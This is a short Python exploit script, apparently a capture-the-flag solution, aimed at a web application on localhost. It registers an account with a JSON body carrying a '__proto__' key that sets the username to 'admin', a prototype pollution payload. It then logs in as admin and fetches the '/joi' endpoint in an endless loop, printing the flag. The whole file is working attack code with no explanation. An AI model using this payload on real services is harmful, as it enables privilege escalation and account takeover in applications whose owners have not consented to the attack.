import requests

REG_BODY = {"__proto__":{"username":"admin"}, "password":"honk"}
LOGIN_BODY = {"username":"admin", "password":"honk"}
URL = 'http://localhost:6969'


s = requests.Session()

register = s.post(URL + '/user/register', json=REG_BODY)

login = s.post(URL + '/user/login', json=LOGIN_BODY)

while (True):
	flag = s.get(URL + '/joi')
	print(flag.text)